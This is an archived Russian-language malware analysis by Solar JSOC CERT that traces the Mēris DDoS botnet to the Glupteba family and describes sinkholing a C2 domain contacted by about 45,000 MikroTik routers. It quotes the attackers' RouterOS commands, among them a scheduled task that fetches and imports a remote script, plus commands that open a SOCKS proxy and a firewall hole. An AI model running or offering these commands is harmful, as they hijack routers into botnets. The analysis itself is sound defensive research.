{
    "id": "bc1282e0-bd1d-4fb6-bd45-d4e3149d0e3c",
    "created_at": "2023-01-12T15:01:07.184951Z",
    "updated_at": "2025-03-27T02:05:47.073187Z",
    "deleted_at": null,
    "sha1_hash": "0dfaa66a5c30d8887b658b28324100a767f35165",
    "title": "2021-09-20 - How we searched for a connection between Mēris and Glupteba, and gained control over 45 thousand MikroTik devices",
    "authors": "",
    "file_creation_date": "2022-05-28T18:29:10Z",
    "file_modification_date": "2022-05-28T18:29:10Z",
    "file_size": 692530,
    "plain_text": "# Как мы искали связь между Mēris и Glupteba, а получили контроль над 45 тысячами устройств MikroTik\n\n**habr.com/ru/company/solarsecurity/blog/578900/**\n\nJSOC_CERT\n\n[Ростелеком-Солар](https://habr.com/ru/company/solarsecurity/profile/)\nБезопасность по имени Солнце\n\nНеделю назад стало известно о рекордной DDoS-атаке на компанию Яндекс с\nвпечатляющим значением в 21,8 млн RPS. Сотрудники Яндекса совместно с компанией\nQrator Labs рассказали,\n\nчто инструментом проведения атаки был ботнет Mēris, состоящий из сетевых устройств\nкомпании Mikrotik. При этом они отметили, что изучить образец бота у них не было\nвозможности, но утверждение, что Mēris – это «вернувшийcя Mirai», не совсем точно\nиз-за различия в сетевых уровнях атаки (L7 и L3).\n\nМы уверены, что данные обстоятельства привлекли внимание многих специалистов\n\nпо информационной безопасности в попытках изучения внутреннего устройства\nботнета Mēris\n\nи природы его возникновения. Мы в Solar JSOC CERT не стали исключением и пришли\nк выводу, что, возможно, Mēris начал зарождаться еще в 2018 году с помощью\nвредоносного семейства Glupteba, которое до сих пор является «поставщиком»\nустройств для Mēris. Так же нам удалось получить контроль над 45 тысячами устройств\n\n\n-----\n\nMikroTik.\n\nJSOC CERT имеет распределенную по миру сеть honeypot-устройств для изучения\nмассовых атак и вредоносных семейств с 2019 года. Последние два года мы\nнаблюдали за попытками заражения устройств MikroTik при помощи брутфорса\nпаролей по ssh и эксплуатации уязвимости CVE-2018-14847, позволяющей получить\nучетную запись администратора. Как правило после удачного входа на устройство\nпрописывается команда на добавление задачи в планировщик задач RouterOS\nследующего вида:\n```\n/system scheduler add name=\"U6\" interval=10m on-event=\"/tool \nfetch url=http://…/poll/eb62f787-db25-489b-b60d-de8f23940ba2 mode=http dstpath=7wmp0b4s.rsc\\r\\n/import 7wmp0b4s.rsc\"\npolicy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,w\n\n```\nУ всех URL всегда присутствовала характерная часть “/poll/”, идентификатор же\nпостоянно менялся. Кроме того, сервер управления всегда проверяет User-Agent в httpзапросе и отдает нагрузку только устройствам MikroTik (User-Agent: Mikrotik/6.x Fetch).\n\nЧерез некоторое время после заражения устройства по ссылке из запланированной\nзадачи скачивается и запускается скрипт с командами (об этом уже [писали на Хабре):](https://habr.com/ru/company/ruvds/blog/559398/)\n```\n:do { /system scheduler set U6 interval=00:03:00 } on-error={ :put \"U6 not found\"}\n:do { /system scheduler set U7 interval=00:03:00 } on-error={ :put \"U7 not found\"}\n:do { /ip service disable telnet } on-error={ :put \"disable telnet error\"}\n:do { /ip service disable api } on-error={ :put \"disable api error\"}\n:do { /ip service disable api-ssl } on-error={ :put \"disable api-ssl error\"}\n:do { /ip service set ssh port= } on-error={ :put \"set ssh port error\"}\n:do { /ip socks set enabled=yes } on-error={ :put \"socks enable error\"}\n:do { /ip socks set port=5678 } on-error={ :put \"set socks port error\"}\n:do { /ip firewall filter add action=accept chain=input disabled=no dst-port=5678\nprotocol=tcp place-before=1 } on-error={ :put \"firewall error\"}\n\n```\nУстройства MikroTik занимают небольшую часть в нашей honeypot-сети, поэтому мы не\nмогли, оперируя лишь нашими данными, рассуждать о масштабах угрозы.\n\n9 сентября 2021 года на наши устройства MikroTik с серверов управления (ниже в\nтаблице) пришла очередная задача (описанного выше формата), которую мы не\nвстречали ранее.\nОна содержала ссылку на Яндекс (по указанным ссылкам сейчас находится заглушка,\nрекомендующая проверить компьютер на вирусы; изначальное содержимое нам\nнеизвестно):\n\n\n-----\n\n```\n:do { /system scheduler set U6 interval 00:03:00 } on error { :put U6 not found }\n:do { /system scheduler set U7 interval=00:03:00 } on-error={ :put \"U7 not found\"}\n:do { /ip service disable telnet } on-error={ :put \"disable telnet error\"}\n:do { /ip service disable api } on-error={ :put \"disable api error\"}\n:do { /ip service disable api-ssl } on-error={ :put \"disable api-ssl error\"}\n:do { /ip service set ssh port= } on-error={ :put \"set ssh port error\"}\n:do { /ip socks set enabled=yes } on-error={ :put \"socks enable error\"}\n:do { /ip socks set port=5678 } on-error={ :put \"set socks port error\"}\n:do { /ip firewall filter add action=accept chain=input disabled=no dst-port=5678\nprotocol=tcp place-before=1 } on-error={ :put \"firewall error\"}\n:do { /tool fetch mode=https\nurl=\"https://yandex[.]ru/Cphzp2XC7Q02VExgJtvysup9dHTCN9A0\" http-method=get }\n:do { /tool fetch mode=https\nurl=\"https://yandex[.]ru/Cphzp2XC7Q02VExgJtvysup9dHTCN9A0?init\" http-method=get }\n\n```\nТак же в этот день Яндекс опубликовал новость о DDoS-атаке. Прочитав ее, мы\nсделали предположение, что именно таким образом и была организована атака\n(технических подробностей на тот момент представлено не было). То есть в качестве\nсемпла вредоносного кода выступает лишь задача в планировщике RouterOS.\n\n10 сентября 2021 мы зафиксировали распространение команды, в которой\nпередавались параметры авторизации на FTP-сервере и задача по выгрузке на него\nконфигурационного файла зараженного устройства.\n\nМы забрали и проанализировали все конфигурационные файлы (они не содержат\nпубличные адреса, логины и пароли). В итоге нам удалось идентифицировать общее\nколичество уникальных устройств равное 95500.\n\n\n-----\n\n-----\n\nПри сравнении полученной информации о регионах устройств, версиях ОС и открытых\nSocks-proxy с данными в посте Яндекса мы заметили очевидное сходство.\n\nВажной информацией в конфигурационных файлах всех устройств MikroTik было\nналичие записей о задачах в RouterOS. Мы проанализировали доменные имена\n(ниже), с которых взломанные устройства скачивали скрипты, и это привело нас к\nвредоносному семейству Glupteba, о котором мы уже [рассказывали.](https://habr.com/ru/company/solarsecurity/blog/558226/)\n\nИменно тут мы и вспомнили, что Glupteba имеет в своем арсенале модуль для\nзаражения MikroTik, который, к слову, работает тоже через брутфорс паролей по ssh и\nэксплуатации уязвимости CVE-2018-14847 и создает ровно такие же задачи.\n\nО данном модуле ранее писали Sophos и TrendMicro (см. [здесь и](https://news.sophos.com/wp-content/uploads/2020/06/glupteba_final-1.pdf) [здесь).](https://www.trendmicro.com/en_us/research/19/i/glupteba-campaign-hits-network-routers-and-updates-cc-servers-with-data-from-bitcoin-transactions.html)\n\nПример шаблона для формирования задачи из модуля:\n\n\n-----\n\nПомните про идентификатор задачи, который присылался вместе с доменом и\nрасполагался после характерной части “/poll/”? Так вот это UUID, который формируется\nпри помощи библиотеки [github.com/gofrs/uuid как в основном модуле Glupteba, так и в](https://github.com/gofrs/uuid)\nмодуле Mikrotik.\n\nОт себя скажем, что мы встречались с разными модулями Glupteba для Mikrotik.\nУсловно их можно разделить на несколько групп:\n\n1. Язык: Go, один вшитый домен для формирования задачи;\n2. Язык: Go, несколько вшитых доменов (обычно, три), один из которых выбирается\n\nслучайным образом;\n3. Язык: C++ с использованием boost.\n\nСоставили таблицу, в которой мы привели данные о доменах, найденных во\nвредоносных задачах конфигурационных файлов 95500 устройств Mikrotik и доменах,\nкоторые мы обнаружили в модулях семейства Glupteba:\n\nОписанные выше данные позволяют предположить, что вредоносное семейство\nGlupteba, участвовало в формировании ботнета Mēris. Мы думали, что на этом наше\nисследование подойдет к концу, но самое интересное нас еще ждало впереди.\n\n14 сентября 2021 в 17:37 на нашем ханипоте MikroTik была запущена очередная\nкоманда, которая отсылала зараженное устройство на CnC-адрес cosmosentry[.]com.\nМы очень удивились, когда выяснили, что это доменное имя еще никому не\nпринадлежит, и быстро зарегистрировали его на себя. За шесть дней на наш сервер\nобратилось около 78 тысяч уникальных IP c характерным для MikroTik User-Agent, и мы\nдумали, что это соответствует количеству зараженных устройств.\n\nОднако после изучения статистических данных оказалось, что на самом деле\nустройств около 45 тысяч, а такое количество IP-адресов получилось из-за\nдинамической адресации. То есть многие устройства не имеют белого адреса и\nнаходятся во внутренней сети, что еще раз наводит на мысль об участии в этом деле\nсемейства Glupteba.\n\n\n-----\n\nНапример, на рисунке представлена одна «белая подсеть» по маске /24, из которой\nидут обращения к cosmosentry[.]com.\n\nРаспределение по geo IP:\n\n\n-----\n\nНаша статистика по геопринадлежности зараженных устройств схожа с данными в\nпосте Яндекса (Бразилия, Индонезия, Индия, Бангладеш). Но есть и различия (у нас\nбольшую часть занимает Украина). Вероятно, у ботнета Mēris несколько серверов\nуправления и нам доступна только часть устройств.\n\nВ конце хочется напомнить, что, к сожалению, мы не можем предпринять никаких\nактивных действий с подконтрольными нам устройствами (у нас нет на это\nполномочий). В настоящий момент порядка 45 тысяч устройств MikroTik обращаются к\nнам, как к sinkhole-домену.\n\nИнформация уже передана в НКЦКИ.\n\n\n-----\n\n**_Игорь Залевский, руководитель отдела расследования киберинцидентов Solar_**\n_JSOC CERT, «Ростелеком-Солар»_\n+53\n\n19K\n\n\n-----",
    "language": "RU",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-20 - How we searched for a connection between Mēris and Glupteba, and gained control over 45 thousand MikroTik devices.pdf"
    ],
    "report_names": [
        "2021-09-20 - How we searched for a connection between Mēris and Glupteba, and gained control over 45 thousand MikroTik devices.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535667,
    "ts_updated_at": 1743041147,
    "ts_creation_date": 1653762550,
    "ts_modification_date": 1653762550,
    "files": {
        "pdf": "https://archive.orkl.eu/0dfaa66a5c30d8887b658b28324100a767f35165.pdf",
        "text": "https://archive.orkl.eu/0dfaa66a5c30d8887b658b28324100a767f35165.txt",
        "img": "https://archive.orkl.eu/0dfaa66a5c30d8887b658b28324100a767f35165.jpg"
    }
}